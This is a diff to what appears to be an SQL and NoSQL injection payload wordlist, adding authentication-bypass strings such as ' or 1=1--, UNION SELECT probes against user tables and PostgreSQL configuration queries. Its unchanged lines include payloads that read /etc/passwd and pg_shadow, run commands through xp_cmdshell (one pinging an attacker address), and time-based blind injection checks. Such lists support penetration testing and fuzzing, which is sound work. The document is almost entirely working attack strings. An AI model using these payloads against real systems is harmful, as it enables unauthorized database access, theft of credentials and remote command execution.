@@ -23,11 +23,17 @@ or true--
 ' or true--
 ") or true--
 ') or true--
+' or 'x'='x
 ') or ('x')=('x
 ')) or (('x'))=(('x
 " or "x"="x
 ") or ("x")=("x
 ")) or (("x"))=(("x
+' or 1=1-- -
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
 admin' --
 admin' #
 admin'/*
@@ -48,7 +54,11 @@ admin') or '1'='1
 admin') or '1'='1'--
 admin') or '1'='1'#
 admin') or '1'='1'/*
+' AND 1=0 
+UNION ALL SELECT 
+'admin';--
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+
 admin" --
 admin'#
 admin'--
@@ -86,6 +96,7 @@ admin") or "1"="1"/*
 "/*
 ' and 1='1
 ' and a='a
+or 1=1
 or true
 ' or ''='
 " or ""="
@@ -123,7 +134,9 @@ or 1=1–
 ' or '1'='1'#
 ' or '1′='1
 ' or 1=1
+' or 1=1 --
 ' or 1=1 –
+' or 1=1--
 ' or 1=1;#
 ' or 1=1/*
 ' or 1=1#
@@ -140,6 +153,11 @@ or 1=1–
 ') or ('1'='1'#
 'or'1=1
 'or'1=1′
+' or 1=1-- -#
+' or 1=1-- --
+" or 1=1-- -
+" or 1=1-- --
+' or 1=1;-- -
 " or "1"="1
 " or "1"="1"--
 " or "1"="1"/*
@@ -180,21 +198,24 @@ or 1=1–
 ' or username like '%
 ' or 'x'='x
 ') or ('x'='x
+" or "x"="x
 ' OR 'x'='x'#;
 '=' 'or' and '=' 'or'
 ' UNION ALL SELECT 1, @@version;#
+' UNION SELECT * FROM leve3_users;-- -
 ' UNION ALL SELECT system_user(),user();#
 ' UNION select table_schema,table_name FROM information_Schema.tables;#
 admin' and substring(password/text(),1,1)='7
 ' and substring(password/text(),1,1)='7
 ' or 1=1 limit 1 -- -+
 '="or'
-select version();
+select version();	
 select current_database();
 select current_user;
 select session_user;
 select current_setting('log_connections');
 select current_setting('log_statement');
+select current_setting('port');
 select current_setting('password_encryption');
 select current_setting('krb_server_keyfile');
 select current_setting('virtual_host');
@@ -205,10 +226,17 @@ select current_setting('data_directory');
 select * from pg_shadow;
 select * from pg_group;
 create table myfile (input TEXT);
-copy myfile from '/etc/passwd';
+copy myfile from '/etc/passwd'; 
 select * from myfile;copy myfile to /tmp/test;
 create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
 <username>' OR 1=1--
+'OR '' = '
+<username>'--
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+<username>' OR 1=1--
+'OR '' = '
 <username>'--
 ' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
 'OR 1=1--
@@ -218,7 +246,7 @@ select @@servernamee
 select @@microsoftversione
 select * from master..sysserverse
 select * from sysusers
-exec master..xp_cmdshell 'ipconfig+/all'
+exec master..xp_cmdshell 'ipconfig+/all'	
 exec master..xp_cmdshell 'net+view'
 exec master..xp_cmdshell 'net+users'
 exec master..xp_cmdshell 'ping+<attackerip>'
@@ -257,6 +285,7 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 ';sleep(5000);'
 ';sleep(5000);+'
 ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+1
 1 and user_name() = 'dbo'
 \'; desc users; --
 1\'1
@@ -279,7 +308,7 @@ fake@ema'or'il.nl'='il.nl
 '; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
 '; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --
 '; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --
-'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
 '; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
 '; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
 ; --
@@ -287,10 +316,10 @@ fake@ema'or'il.nl'='il.nl
 '); --
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
 ' grant connect to name; grant resource to name; --
-' or 1=1 --
+' or 1=1 -- 
 ' union (select @@version) --
 ' union (select NULL, (select @@version)) --
 ' union (select NULL, NULL, (select @@version)) --
 ' union (select NULL, NULL, NULL,  (select @@version)) --
 ' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
-' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --a
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
